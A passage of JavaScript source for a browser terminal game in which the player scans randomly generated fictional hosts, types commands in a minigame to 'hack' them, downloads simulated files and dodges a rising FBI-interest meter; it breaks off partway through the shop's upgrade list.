(() => {
  const outputEl = document.getElementById('output');
  const inputEl = document.getElementById('cmd-input');
  // legacy hackerFill may be absent now; keep reference if present
  const hackerFill = document.getElementById('hacker-fill');
  const fbiFill = document.getElementById('fbi-fill');
  const scoreBig = document.getElementById('score-big');
  const scoreMult = document.getElementById('score-mult');
  const scoreCurrent = null; // removed "Current Hack" display per user request
  const fbiValue = document.getElementById('fbi-value');

  const state = {
    hackerScore: 0,
    fbiInterest: 0
  };

  // ensure persistent game state bag exists and multiplier defaults to 1
  window._game = window._game || {};
  window._game.lastMultiplier = window._game.lastMultiplier || 1;
  // purchases and upgrade flags
  window._game.purchases = window._game.purchases || [];
  window._game.upgrades = window._game.upgrades || {};
  // effect multipliers with sensible defaults
  window._game.fbiDecayMultiplier = window._game.fbiDecayMultiplier || 1;
  window._game.downloadSpeedMultiplier = window._game.downloadSpeedMultiplier || 1;

  // track the highest observed base hacker score to prevent accidental decreases
  let lastHackerScore = 0;

  // simple command history for ArrowUp/ArrowDown navigation
  let cmdHistory = [];
  let historyIndex = -1; // points inside cmdHistory or equals cmdHistory.length for 'new' entry

  // helper: pick a random username for remote prompt
  function pickRandomUser() {
    const names = ['neo','root','admin','sys','operator','guest','haxor','zero','morpheus','trinity','pilot','delta','sigma','echo','pixel'];
    return names[Math.floor(Math.random()*names.length)];
  }

  // 100 silly hacker rank names (index 0 => rank 1)
  const RANK_NAMES = [
    'Script Kiddie', 'NoobN00b', 'PwnPadawan', 'GlitchedGremlin', 'BitBandit', 'SubnetSurfer', 'PacketPusher', 'NullByteNinja', 'EchoEmp', 'ShadowScripter',
    'BufferBuccaneer', 'RootRascal', 'HeapHooligan', 'KernelKiddie', 'ProxyPixie', 'PhantomPhisher', 'WormWhisperer', 'SyntaxSamurai', 'HexHopper', 'PingPunk',
    'GhostGopher', 'CryptoCracker', '404Finder', 'TorTrooper', 'SocketSleuth', 'PacketPirate', 'NMAPNerd', 'CobaltCoder', 'BinaryBandit', 'ZeroDayZed',
    'SlackSniper', 'BitBender', 'LoopLurker', 'PortPhantom', 'RootRogue', 'ShellShock', 'CipherSeeker', 'VaporVandal', 'SpamSprinter', 'TrojanTrickster',
    'HexHacker', 'WraithWriter', 'FuzzerFox', 'BackdoorBeast', 'SudoSlinger', 'GhostWalker', 'NexusNabber', 'GadgetGanker', 'PacketProwler', 'SignalSlicer',
    'ProxyPhantom', 'RogueRouter', 'ColdCallCoder', 'DDoSDrifter', 'ShadowScript', 'InkInjector', 'BinaryBishop', 'MalwareMaven', 'ByteBandito', 'LoopLord',
    'FluxFiddler', 'GigaGrifter', 'SparkSplicer', 'NetNinja', 'CacheCobra', 'HeapHunter', 'RootReaper', 'EchoEraser', 'SiphonSage', 'PingParrot',
    'TraceTactician', 'WormWarden', 'PacketPaladin', 'KernelKing', 'CloudCorsair', 'ScriptSavant', 'ByteBruiser', 'VoltVandal', 'FiddleFist', 'ProxyPrince',
    'QuantumQuirk', 'LatchLancer', 'HashHacker', 'SocketSultan', 'PhantomProbe', 'HexHerald', 'ZeroZenith', 'BrickBreaker', 'SleetSlicer', 'FogForger',
    'NeonNetrunner', 'SpectreSpinner', 'VoltViper', 'NullNomad', 'GlitchGargoyle', 'L33tLurker', 'ObsidianOperator', 'PwnPuppeteer', 'CipherCzar', '1337 H4CK3R PWN3R 0F 4LL!!!'
  ];

  // helper: current prompt string depending on connection
  function getPrompt() {
    if (connection && connection.user && connection.domain) {
      return `${connection.user}@${connection.domain}$ `;
    }
    return 'guest@l33t:~$ ';
  }

  function appendLine(text, className) {
    const div = document.createElement('div');
    div.className = 'line' + (className ? ' ' + className : '');
    div.textContent = text;
    outputEl.appendChild(div);
    outputEl.scrollTop = outputEl.scrollHeight;
  }

  function renderMeters() {
    // Hacker score is unbounded (display full value). Meter fill caps at 100% visually.
    const hs = state.hackerScore;
    const fi = Math.max(0, Math.min(100, state.fbiInterest));
    const fillHs = Math.max(0, Math.min(100, hs));
    if (hackerFill) hackerFill.style.height = fillHs + '%';
    if (fbiFill) fbiFill.style.height = fi + '%';
    // show live total = base score + current hack accrual
    const cur = hackState && typeof hackState.currentPoints === 'number' ? hackState.currentPoints : 0;
    if (scoreBig) scoreBig.textContent = Math.round(hs);
    // multiplier and current hack points come from hackState when active
  const mult = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game && window._game.lastMultiplier) || 1);
    if (scoreMult) scoreMult.textContent = `Multiplier: x${mult}`;
    if (scoreCurrent) scoreCurrent.textContent = `Current hack: ${Math.round(cur)} pts`;
    // compute rank: 100 ranks, rank increases every 1000 points. rank 1 = 0-999, rank 100 = 99999+
    const rawRank = Math.min(100, 1 + Math.floor((hs + cur) / 1000));
    const rankNames = {
      1: 'Script Kiddie',
      100: '1337 H4CK3R PWN3R 0F 4LL!!!'
    };
  // map rawRank (1..100) to RANK_NAMES array (0..99)
  const idx = Math.max(0, Math.min(99, rawRank - 1));
  const rankLabel = RANK_NAMES[idx] || `Rank ${rawRank}`;
  const rankEl = document.getElementById('player-rank');
    if (rankEl) rankEl.textContent = rankLabel;
    if (fbiValue) fbiValue.textContent = Math.round(fi);
    // check for ultimate unlock prompt
    maybeShowUltimate();
  }

  // if player reaches ultimate hacker score threshold, prompt special instruction once
  let _ultimatePromptShown = false;
  function maybeShowUltimate() {
    if (_ultimatePromptShown) return;
    if (state.hackerScore >= 100000) {
      _ultimatePromptShown = true;
      // if a hack minigame is active, cancel it so the player can immediately run the FBI scan
      try { if (hackState) endHack(false); } catch (e) {}
      // non-blocking modal
      showModal('ULTIMATE HACKER UNLOCKED', `You have reached 100000 HACKER SCORE and are now the ultimate hacker.\n\nType the command: scan FBI\n\nThis will reveal a single target: fbi.gov (The Federal Bureau of Investigation).`);
      // show banner CTA above the terminal encouraging the player to scan the FBI
      try {
        const b = document.getElementById('banner-cta');
        if (b) {
          b.textContent = ' HACK THE FBI: run > scan FBI !!!!!!! HACK THOSE LOSERS! ';
          b.style.display = 'block';
        }
      } catch (e) {}
    }
  }

  // show a transient, casino-style '+N' indicator on the right when FBI interest increases
  function showFbiDelta(n) {
    try {
      if (!n || n === 0) return;
      let holder = document.querySelector('.fbi-delta-holder');
      if (!holder) {
        holder = document.createElement('div');
        holder.className = 'fbi-delta-holder';
        document.body.appendChild(holder);
      }
      const el = document.createElement('div');
      el.className = 'fbi-delta ' + (Math.abs(n) > 8 ? 'big' : (Math.abs(n) > 3 ? '' : 'small')) + (n > 0 ? ' positive' : ' negative');
      el.textContent = (n > 0 ? `+${n}` : `${n}`);
      // particles container
      const particles = document.createElement('div'); particles.className = 'fbi-particles';
      el.appendChild(particles);
      holder.appendChild(el);

      // create a few particle dots that animate outward
      const pcount = Math.min(8, Math.max(3, Math.abs(n)));
      for (let i=0;i<pcount;i++) {
        const p = document.createElement('div'); p.className = 'fbi-particle';
        particles.appendChild(p);
        // randomize spread (emit to the right from the right-side holder)
        const angle = (Math.random()*Math.PI) - (Math.PI / 2); // -90deg .. +90deg (rightwards hemisphere when flipped)
        const dist = 24 + Math.random()*56;
        const dx = Math.cos(angle)*dist; const dy = Math.sin(angle)*dist;
        // position relative to right edge
        p.style.right = '6px'; p.style.top = '50%';
        p.animate([
          { transform: 'translate(0,0) scale(1)', opacity:1 },
          { transform: `translate(${ -dx }px, ${dy}px) scale(0.5)`, opacity:0 }
        ], { duration: 900 + Math.random()*300, easing: 'cubic-bezier(.2,.9,.3,1)' });
        setTimeout(() => { try { particles.removeChild(p); } catch(e) {} }, 1400);
      }

      // remove after animation
      setTimeout(() => { try { if (holder.contains(el)) holder.removeChild(el); } catch(e) {} }, 1200);
    } catch (e) {}
  }

  function handleCommand(raw) {
    window._game = window._game || {};
    if (window._game._gameOver) {
      appendLine('Game over. Please restart to play again.', 'muted');
      return;
    }
  const cmd = (raw || '').trim();
  // prefer using the visible prompt span if present
  const promptSpan = document.querySelector('.prompt');
  const promptText = promptSpan ? (promptSpan.textContent + ' ') : getPrompt();
  appendLine(promptText + cmd, 'muted');
    // visual feedback: small shake + glow
    // apply text-level shake to output and input-line
    const out = document.querySelector('.output');
    const inLine = document.querySelector('.input-line');
    if (out || inLine) {
      out && out.classList.remove('text-shake');
      inLine && inLine.classList.remove('text-shake');
      // force reflow
      void (out && out.offsetWidth);
      void (inLine && inLine.offsetWidth);
      out && out.classList.add('text-shake');
      inLine && inLine.classList.add('text-shake');
      setTimeout(() => out && out.classList.remove('text-shake'), 350);
      setTimeout(() => inLine && inLine.classList.remove('text-shake'), 350);
    }
    if (!cmd) return;

    const parts = cmd.split(/\s+/);
    const name = parts[0].toLowerCase();
    const args = parts.slice(1);

    // If connected to a remote machine, only allow remote commands
    if (connection) {
      const remoteAllowed = ['clear','cls','exit','help','find','cat','download'];
      if (!remoteAllowed.includes(name)) {
        appendLine('The specified command does not exist.', 'muted');
        return;
      }
    }

    if (name === 'help') {
      if (connection) {
        const entries = [
          {cmd: 'cat <file>', desc: 'display the contents of a remote file'},
          {cmd: 'clear', desc: 'clear the terminal output on remote machine'},
          {cmd: 'download <file>', desc: 'download a file from the remote host (adds FBI interest)'},
          {cmd: 'exit', desc: 'disconnect and return to local terminal'},
          {cmd: 'find', desc: 'search the remote filesystem for interesting files'},
          {cmd: 'help', desc: 'show this help text for remote machine'}
        ];
        entries.sort((a,b) => a.cmd.localeCompare(b.cmd));
        appendLine('Available commands on remote machine:', 'muted');
        entries.forEach(e => appendLine(`  ${e.cmd} - ${e.desc}`, 'muted'));
      } else {
        const entries = [
          {cmd: 'cat <file>', desc: 'read a downloaded file'},
          {cmd: 'clear', desc: 'clear the terminal output'},
          {cmd: 'cls', desc: 'clear the terminal output'},
          {cmd: 'connect <ip|hostname>', desc: 'connect to a hacked machine you own'},
          {cmd: 'hack <ip|hostname>', desc: 'attempt to hack a scanned target'},
          {cmd: 'help', desc: 'show this help text'},
          {cmd: 'shop', desc: 'open the in-game shop to purchase upgrades'},
          {cmd: 'purchase <index>', desc: 'buy an upgrade by its shop index using HACKER SCORE'},
          {cmd: 'list-purchases', desc: 'show upgrades you have purchased'},
          {cmd: 'list-downloads', desc: 'show files you have downloaded'},
          {cmd: 'list-owned', desc: 'show hacked machines you own'},
          {cmd: 'list-scan', desc: 'show all previously discovered scan results'},
          {cmd: 'scan', desc: 'discover random vulnerable systems'}
        ];
        entries.sort((a,b) => a.cmd.localeCompare(b.cmd));
        appendLine('Available commands:', 'muted');
        entries.forEach(e => appendLine(`  ${e.cmd} - ${e.desc}`, 'muted'));
    appendLine('  restart - restart the game (clear session)', 'muted');
      }
    } else if (name === 'scan') {
      // special-case: scanning the FBI if the player was prompted/unlocked
      if (args.length > 0 && args[0].toLowerCase() === 'fbi') {
        // ensure player has reached the ultimate threshold (safety check)
        if (state.hackerScore < 100000) {
          appendLine('Scan target not found.', 'muted');
          return;
        }
        // produce one FBI entry with random ip and host fbi.gov
        const ip = Array.from({length:4}, ()=> Math.floor(Math.random()*254)+1).join('.');
        const host = 'fbi.gov';
        const cat = ' The Federal Bureau of Investigation ';
        const entry = `${ip}  ${host}  ${cat}`;
        appendLine(entry);
        window._game = window._game || {};
        window._game.scanHistory = window._game.scanHistory || [];
        window._game.scanHistory.push(entry);
  // scanning the FBI will increase FBI interest by 5 points
  state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 5);
  showFbiDelta(5);
        renderMeters();
        return;
      }
  // choose number of hosts between 2 and 10, biased toward fewer hosts
  const count = 2 + Math.floor(Math.pow(Math.random(), 1.6) * 9); // 2..10, skewed low
      const cats = [
        'NASA','Military','Government','Grandma','Personal','School','Hospital','Small Business','ISP','Large Business',
        'Laptop','Gaming Desktop','Research Lab','University','Data Center','Cloud Provider','Retail POS','ATM','Banking',
        'Smart TV','Router','IoT Thermostat','Municipal','Power Grid','Transit System','Media Outlet','Pharmacy','Clinic',
        'Drone','Satellite Groundstation','Factory','Police','FireDept','Library','Archive','Supermarket','Hotel','Museum'
      ];

      function randIp(){
        return Array.from({length:4}, ()=> Math.floor(Math.random()*254)+1).join('.');
      }

      // more realistic hostname generator with varied patterns
      function randWord(){
        const words = ['alpha','omega','delta','nova','cypher','quantum','atlas','zephyr','titan','hera','argos','neon','pulse','vector','raven','onyx','jade','volt','sable','lumen','spectre','orchid','mercury','apollo','merit'];
        return words[Math.floor(Math.random()*words.length)];
      }

      function randNum(digits=2){
        return Math.floor(Math.random()*(10**digits));
      }

      function randUser(){
        const names = ['alice','bob','carol','dave','eve','mallory','trent','peggy','victor','oscar'];
        return names[Math.floor(Math.random()*names.length)];
      }

      function randDomain(){
        const domains = ['example.com','corp.net','company.org','service.io','gov.local','university.edu','clinic.health','shop.co','network.lan'];
        return domains[Math.floor(Math.random()*domains.length)];
      }

      function randSubdomain(){
        const subs = ['mail','db','vpn','web','api','proxy','backup','dev','test'];
        return `${subs[Math.floor(Math.random()*subs.length)]}.${randDomain()}`;
      }

      function randHostname(){
        const patterns = [
          () => `${randWord()}.${randDomain()}`,
          () => `${randWord()}-${randNum(2)}.${randDomain()}`,
          () => `srv${randNum(2)}.${randDomain()}`,
          () => `${randUser()}-laptop.${randDomain()}`,
          () => `${randWord()}${randNum(3)}.${randDomain()}`,
          () => `${randSubdomain()}`
        ];
        const pick = patterns[Math.floor(Math.random()*patterns.length)];
        return pick();
      }

      // ensure scan history exists
      window._game = window._game || {};
      window._game.scanHistory = window._game.scanHistory || [];

      // build sets of used IPs and hosts from history so new ones are unique
      const usedIps = new Set();
      const usedHosts = new Set();
      (window._game.scanHistory || []).forEach(e => {
        const parts = e.split('  ');
        if (parts[0]) usedIps.add(parts[0]);
        if (parts[1]) usedHosts.add(parts[1]);
      });

      // prepare entries (do not append immediately)
      const entriesToShow = [];
      for(let i=0;i<count;i++){
        // generate unique ip
        let ip = randIp();
        let tries = 0;
        while(usedIps.has(ip) && tries < 200){ ip = randIp(); tries++; }
        if (usedIps.has(ip)) {
          ip = ip + '-' + Date.now()%1000 + i;
        }

        // generate unique host
        let host = randHostname();
        tries = 0;
        while(usedHosts.has(host) && tries < 200){ host = randHostname(); tries++; }
        if (usedHosts.has(host)) {
          host = host.replace(/\.[^\.]+$/, '') + '-' + Math.floor(Math.random()*900+100) + '.' + randDomain();
        }

        const cat = cats[Math.floor(Math.random()*cats.length)];
        const entry = `${ip}  ${host}  ${cat}`;
        entriesToShow.push({ ip, host, cat, entry });
        // reserve these so future generations avoid collision
        usedIps.add(ip);
        usedHosts.add(host);
      }

      // helper: sleep
      function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }

      // helper: typewriter append that takes ~1s total per host
      function typewriterLine(text, className){
        return new Promise((resolve) => {
          try {
            const div = document.createElement('div');
            div.className = 'line' + (className ? ' ' + className : '');
            outputEl.appendChild(div);
            outputEl.scrollTop = outputEl.scrollHeight;
            const totalMs = 333; // aim for ~0.33s per host (three times faster)
            const delay = Math.max(6, Math.floor(totalMs / Math.max(1, text.length)));
            let i = 0;
            const t = setInterval(() => {
              i++;
              div.textContent = text.slice(0, i);
              outputEl.scrollTop = outputEl.scrollHeight;
              if (i >= text.length) {
                clearInterval(t);
                resolve();
              }
            }, delay);
          } catch(e) { resolve(); }
        });
      }

      // reveal entries sequentially, 1 second-ish per host with typing effect
      (async () => {
        for (const obj of entriesToShow) {
          await typewriterLine(obj.entry);
          // record in history and update meters
          window._game.scanHistory.push(obj.entry);
          // each discovered host raises FBI interest by 5 points
          state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 5);
          showFbiDelta(5);
          renderMeters();
          // small pause to allow the faster typewriter effect to settle
          await sleep(20);
        }
      })();
    } else if (name === 'clear' || name === 'cls') {
      // clear the terminal output (preserve welcome maybe?)
      outputEl.innerHTML = '';
      return;
    } else if (name === 'hack') {
      if (args.length === 0) {
        appendLine('Usage: hack <ip|hostname>', 'muted');
      } else {
        startHack(args[0]);
      }
      return;
    } else if (name === 'list-owned') {
      window._game = window._game || {};
      const owned = window._game.owned || [];
      if (owned.length === 0) appendLine('No hacked machines yet.', 'muted');
      else { appendLine('Owned machines:', 'muted'); owned.forEach(l => appendLine(l)); }
      return;
    } else if (name === 'list-scan') {
      // print all previous scan results
      window._game = window._game || {};
      const hist = window._game.scanHistory || [];
      if (hist.length === 0) {
        appendLine('No previous scan results recorded.', 'muted');
      } else {
        appendLine('Recorded scan results:', 'muted');
        hist.forEach(line => appendLine(line));
      }
      return;
    } else if (name === 'find') {
      // remote-only: list interesting filenames based on the connected host's category
      if (!connection) {
        appendLine('The specified command does not exist.', 'muted');
        return;
      }
      // derive category from the owned entry string stored in connection.target
      const parts = connection.target.split('  ');
      const cat = (parts[2] || 'Unknown').trim();
      // ensure files exist for this host
      const host = parts[1] || parts[0];
      const fileObjs = generateFilesForHost(cat, host);
      appendLine(`Files on ${host}:`, 'muted');
      fileObjs.forEach(f => {
        const sizeStr = typeof f.size === 'number' ? `${f.size} bytes` : '';
        appendLine(`  ${f.name}  ${sizeStr}`);
      });
      return;
    } else if (name === 'list-downloads') {
      window._game = window._game || {};
      const dl = window._game.downloads || [];
      if (dl.length === 0) {
        appendLine('No downloads recorded.', 'muted');
      } else {
        appendLine('Downloaded files:', 'muted');
        dl.forEach(d => appendLine(`  ${d.name}  from ${d.host}`));
      }
      return;
    } else if (name === 'cat') {
      if (args.length === 0) {
        appendLine('Usage: cat <filename>', 'muted');
        return;
      }
      const filename = args.join(' ');
      // If connected, try to read remote host files first
      if (connection) {
        const parts = connection.target.split('  ');
        const host = parts[1] || parts[0];
        const cat = (parts[2] || 'Unknown').trim();
        const files = ensureFilesMap();
        const fileObjs = files[host] || generateFilesForHost(cat, host);
        const found = fileObjs.find(f => f.name === filename || f.name.toLowerCase() === filename.toLowerCase());
        if (!found) {
          appendLine('File not found on remote host: ' + filename, 'muted');
          return;
        }
        appendLine(`--- ${found.name} (${found.size || 0} bytes) modified: ${found.mtime || 'unknown'} ---`, 'muted');
        const lines = (found.content || '').split('\n');
        lines.forEach(l => appendLine(l));
        appendLine(`--- end of ${found.name} ---`, 'muted');
        return;
      }

      // Not connected: try to read from downloaded files
      window._game = window._game || {};
      const dl = window._game.downloads || [];
      const foundLocal = dl.find(d => d.name === filename || d.name.toLowerCase() === filename.toLowerCase());
      if (!foundLocal) { appendLine('File not found in downloads: ' + filename, 'muted'); return; }
      appendLine(`--- ${foundLocal.name} (${foundLocal.size || 0} bytes) from ${foundLocal.host} ---`, 'muted');
      const linesLocal = (foundLocal.content || '').split('\n');
      linesLocal.forEach(l => appendLine(l));
      appendLine(`--- end of ${foundLocal.name} ---`, 'muted');
      return;
    } else if (name === 'download') {
      // remote-only download command with simulated transfer
      if (!connection) { appendLine('The specified command does not exist.', 'muted'); return; }
      if (args.length === 0) { appendLine('Usage: download <filename>', 'muted'); return; }
      const filename = args.join(' ');
      const parts = connection.target.split('  ');
      const host = parts[1] || parts[0];
      const cat = (parts[2] || 'Unknown').trim();
      const files = ensureFilesMap();
      const fileObjs = files[host] || generateFilesForHost(cat, host);
      const found2 = fileObjs.find(f => f.name === filename || f.name.toLowerCase() === filename.toLowerCase());
  if (!found2) { appendLine('File not found: ' + filename, 'muted'); return; }
  // prevent downloading the same file twice
  window._game = window._game || {};
  window._game.downloads = window._game.downloads || [];
  const already = window._game.downloads.find(d => d.name === found2.name && d.host === host);
  if (already) { appendLine('File already downloaded and cannot be downloaded a second time: ' + found2.name, 'muted'); try { inputEl.focus(); } catch (e) {}; return; }

  // simulate download duration relative to file size
  // file sizes are between 1 and 1337 bytes; clamp and compute duration so:
  // 8 bytes -> 1s, 1337 bytes -> 5s (linear mapping), clamp to 1..5s
  const bytesForCalc = Math.max(1, Math.min(1337, found2.size || 0));
  const minSize = 8, maxSize = 1337, minSec = 1, maxSec = 5;
  const pct = Math.min(1, Math.max(0, (bytesForCalc - minSize) / (maxSize - minSize)));
  let duration = Math.max(minSec, Math.round(minSec + pct * (maxSec - minSec)));
  // apply download speed multiplier from upgrades (e.g., bandwidth doubles speed)
  const dlMult = (window._game && window._game.downloadSpeedMultiplier) ? window._game.downloadSpeedMultiplier : 1;
  duration = Math.max(1, Math.round(duration / dlMult));
  appendLine(`Starting download of ${found2.name} (${found2.size || 0} bytes). Estimated time: ${duration}s`, 'muted');

      // render a simple progress bar in the terminal by updating a single line
      let progress = 0;
      const totalTicks = duration;
  const progressLineIndex = (() => { appendLine(`[${' '.repeat(30)}] 0%  ${found2.name}`); return outputEl.children.length - 1; })();

      // each second, increase FBI by 1 and update progress
      let secondsElapsed = 0;
      const tick = setInterval(() => {
        secondsElapsed++;
  // downloads are riskier: generate 9x FBI interest per second (previously 3)
  state.fbiInterest = Math.min(100, state.fbiInterest + 9);
  showFbiDelta(9);
  renderMeters();
        progress = Math.min(1, secondsElapsed / totalTicks);
        const blocks = Math.floor(progress * 30);
  const bar = '[' + '#'.repeat(blocks) + ' '.repeat(30-blocks) + `] ${Math.floor(progress*100)}%  ${found2.name}`;
        // update the specific output line
        const lineEl = outputEl.children[progressLineIndex];
        if (lineEl) lineEl.textContent = bar;
        // check arrest during download
        if (state.fbiInterest >= 100) {
          clearInterval(tick);
          // non-blocking capture: show modal, apply penalty, and allow play to continue
          handleFbiCapture(`during download of ${found2.name} from ${host}`);
          appendLine(`Download interrupted: ${found2.name} (captured by FBI)`, 'muted');
          // ensure input is focused so the player can continue typing immediately
          try { inputEl.focus(); } catch (e) {}
          return;
        }
        if (secondsElapsed >= totalTicks) {
          clearInterval(tick);
          // finalize download
          // award points: bytes * multiplier
          const bytes = Math.max(1, Math.min(1337, found2.size || 0));
          const mult = Math.max(1, (hackState && hackState.multiplier) ? hackState.multiplier : (window._game.lastMultiplier || 1));
          const bonus = Math.floor(bytes * mult);
          state.hackerScore += bonus;
          lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
          // persist download record
          window._game = window._game || {};
          // ensure lastMultiplier is preserved and never drops to 0 after download
          window._game.lastMultiplier = window._game.lastMultiplier || (hackState && hackState.multiplier) || 1;
          window._game.downloads = window._game.downloads || [];
          window._game.downloads.push({ host, name: found2.name, size: found2.size || 0, mtime: found2.mtime || new Date().toISOString(), content: found2.content });
          appendLine(`Download complete: ${found2.name} (+${bonus} pts)`, 'muted');
          renderMeters();
          // ensure input is focused after download finishes
          try { inputEl.focus(); } catch (e) {}
        }
      }, 1000);
      return;
    } else if (name === 'shop') {
      // show available upgrades with index
      appendLine('Available upgrades:', 'muted');
      UPGRADE_LIST.forEach((u, idx) => {
        appendLine(` ${idx+1}. ${u.name}  Cost: ${u.cost}  - ${u.desc}`);
      });
      appendLine('\nPurchase an upgrade with: purchase <index>');
      return;
    } else if (name === 'purchase') {
      if (args.length === 0) { appendLine('Usage: purchase <index>', 'muted'); return; }
      const idx = parseInt(args[0], 10) - 1;
      if (isNaN(idx) || idx < 0 || idx >= UPGRADE_LIST.length) { appendLine('Invalid upgrade index.', 'muted'); return; }
      const up = UPGRADE_LIST[idx];
      window._game = window._game || {};
      window._game.purchases = window._game.purchases || [];
      if (window._game.purchases.find(p => p.id === up.id)) { appendLine('Upgrade already purchased: ' + up.name, 'muted'); return; }
      if (state.hackerScore < up.cost) { appendLine('Not enough HACKER SCORE to purchase ' + up.name, 'muted'); return; }
      // spend points
      state.hackerScore = Math.max(0, state.hackerScore - up.cost);
      window._game.purchases.push({ id: up.id, name: up.name, boughtAt: Date.now() });
      // apply effects immediately
      if (up.id === 'fasthands') {
        // shorten future hack commands by flag; we'll check when generating commands
        window._game.upgrades.fasthands = true;
      } else if (up.id === 'withoutatrace') {
        window._game.upgrades.withoutatrace = true;
        // decay multiplier: make decay 10x faster by adjusting multiplier
        window._game.fbiDecayMultiplier = 10;
      } else if (up.id === 'bandwidth') {
        window._game.upgrades.bandwidth = true;
        window._game.downloadSpeedMultiplier = 2;
      }
      appendLine(`Purchased: ${up.name} (-${up.cost} pts)`, 'muted');
      renderMeters();
      return;
    } else if (name === 'list-purchases') {
      window._game = window._game || {};
      window._game.purchases = window._game.purchases || [];
      if (window._game.purchases.length === 0) {
        appendLine('No upgrades purchased yet.', 'muted');
      } else {
        appendLine('Purchased upgrades:', 'muted');
        window._game.purchases.forEach((p, i) => appendLine(` ${i+1}. ${p.name} (id: ${p.id})`));
      }
      return;
    } else if (name === 'connect') {
      if (args.length === 0) {
        appendLine('Usage: connect <ip|hostname>', 'muted');
        return;
      }
      window._game = window._game || {};
      const owned = window._game.owned || [];
      const target = owned.find(t => t.includes(args[0]));
      if (!target) {
        appendLine('Target not found in owned machines. Use list-owned to see hacked machines.', 'muted');
        return;
      }
  // determine host/domain for prompt — use the full hostname from the owned entry
  const parts2 = target.split('  ');
  const hostForPrompt = (parts2[1] || parts2[0]) || '';
  const domain = hostForPrompt; // use full hostname as the prompt domain
  const user = pickRandomUser();
      connection = { target, user, domain };
      appendLine('Connected to ' + target, 'muted');
  // connecting to a remote host increases FBI interest slightly
  state.fbiInterest = Math.min(100, (state.fbiInterest || 0) + 5);
  renderMeters();
      // set visible prompt text
      try {
        const ps = document.querySelector('.prompt');
        if (ps) ps.textContent = `${user}@${domain}`;
      } catch(e) {}
      // show short MOTD welcoming the user to the remote host
      const parts = target.split('  ');
      const host = parts[1] || parts[0];
      appendLine(`MOTD: Welcome to ${host}`, 'muted');
      return;
    } else if (name === 'exit') {
      if (connection) {
        appendLine('Disconnected from ' + connection.target, 'muted');
      connection = null;
      try {
        const ps = document.querySelector('.prompt');
        if (ps) ps.textContent = 'guest@l33t:~$';
      } catch(e) {}
        return;
      }
    } else {
      appendLine('Unknown command: ' + name, 'muted');
      appendLine("Type 'help' to see available commands.", 'muted');
    }
    // restart command (local only)
    if (name === 'restart' && !connection) {
      try { location.reload(); } catch (e) { appendLine('Restart not supported in this environment.', 'muted'); }
    }
  }

  inputEl.addEventListener('keydown', (e) => {
    // if hack minigame active, intercept keys
    if (hackState) {
      e.preventDefault();
      // handle backspace
      if (e.key === 'Backspace') {
        // if current pos > 0, move back and unmark
        if (hackState.pos > 0) {
          hackState.pos--;
          const span = minigameEl.children[hackState.pos];
          span.classList.remove('good','bad');
        }
        return;
      }

      // ignore control keys
      if (e.key.length !== 1) return;

      const expected = hackState.command[hackState.pos];
      const ch = e.key;
      const span = minigameEl.children[hackState.pos];
      if (ch === expected) {
        span.classList.remove('bad');
        span.classList.add('good');
        hackState.pos++;
        // scoring: increase combo and multiplier
        hackState.combo = (hackState.combo || 0) + 1;
        // ensure multiplier starts from persisted value and increases cumulatively
        if (!hackState.multiplier) hackState.multiplier = (window._game && window._game.lastMultiplier) || 1;
        // increase multiplier by 1 for each correct char (cumulative across hacks)
        hackState.multiplier = Math.max(1, hackState.multiplier + 1);
      // award points into currentPoints for this hack (clamp to non-negative)
      const pts = Math.max(0, Math.floor(1 * hackState.multiplier));
      // immediately apply points to the real hacker score so the on-screen score matches state
      state.hackerScore += pts;
      lastHackerScore = Math.max(lastHackerScore, state.hackerScore);
      hackState.currentPoints = Math.max(0, (hackState.currentPoints || 0) + pts);
        updateComboUI();
        renderMeters();
        // check complete
        if (hackState.pos >= hackState.command.length) {
          endHack(true);
        }
      } else {
      // mistake: reset combo and multiplier
      span.classList.remove('good');
      span.classList.add('bad');
      hackState.mistakes++;
    hackState.combo = 0;
    // reset multiplier on typo and clear persisted multiplier
    hackState.multiplier = 1;
  try { window._game = window._game || {}; window._game.lastMultiplier = Math.max(1, window._game.lastMultiplier || 1); } catch(e){}
    hackState.currentPoints = Math.max(0, hackState.currentPoints || 0);
      updateComboUI();
  // increase FBI meter per missed character (penalty multiplied by 5)
  state.fbiInterest = Math.min(100, state.fbiInterest + 25);
  showFbiDelta(25);
  renderMeters();
      if (state.fbiInterest >= 100) {
        handleFbiCapture('during hack minigame');
      }
      }
      return;
    }

    if (e.key === 'Enter') {
      const val = inputEl.value;
      // store in history (avoid empty and avoid consecutive duplicates)
      if (val && val.trim()) {
        if (cmdHistory.length === 0 || cmdHistory[cmdHistory.length-1] !== val) {
          cmdHistory.push(val);
        }
      }
      // reset history index to the 'new' position
      historyIndex = cmdHistory.length;

      inputEl.value = '';
      handleCommand(val);
    } else if (e.key === 'c' && e.ctrlKey) {
      inputEl.value = '';
    } else if (e.key === 'Tab') {
      // Tab completion
      e.preventDefault();
      handleTabCompletion();
    } else if (e.key === 'ArrowUp') {
      // navigate back in history
      e.preventDefault();
      if (cmdHistory.length === 0) return;
      if (historyIndex === cmdHistory.length) historyIndex = cmdHistory.length - 1;
      else historyIndex = Math.max(0, historyIndex - 1);
      inputEl.value = cmdHistory[historyIndex] || '';
      // move caret to end
      inputEl.setSelectionRange(inputEl.value.length, inputEl.value.length);
    } else if (e.key === 'ArrowDown') {
      // navigate forward in history
      e.preventDefault();
      if (cmdHistory.length === 0) return;
      if (historyIndex === -1) historyIndex = cmdHistory.length;
      historyIndex = Math.min(cmdHistory.length, historyIndex + 1);
      if (historyIndex >= cmdHistory.length) {
        inputEl.value = '';
      } else {
        inputEl.value = cmdHistory[historyIndex] || '';
      }
      inputEl.setSelectionRange(inputEl.value.length, inputEl.value.length);
    }
  });

  // commands registry for completion
  const COMMANDS = ['help', 'clear', 'cls', 'scan', 'list-scan', 'hack', 'list-owned', 'connect', 'exit', 'cat', 'download', 'list-downloads', 'shop', 'purchase', 'list-purchases'];
  let completionState = { lastInput: null, matches: [], index: 0 };

  // add list-downloads local command
  if (!COMMANDS.includes('list-downloads')) COMMANDS.push('list-downloads');

  // Upgrades available in the shop
  const UPGRADE_LIST = [
    { id: 'fasthands', name: 'Fasthands', cost: 10000, desc: 'Your incredible finger dexterity allows you to type twice as fast! All hack minigame commands are shorter and easier to type.' },
    { id: 'withoutatrace', name: 'Without a trace', cost: 5000, desc: 'You are a ghost in the network; FBI interest decays 10x faster.' },
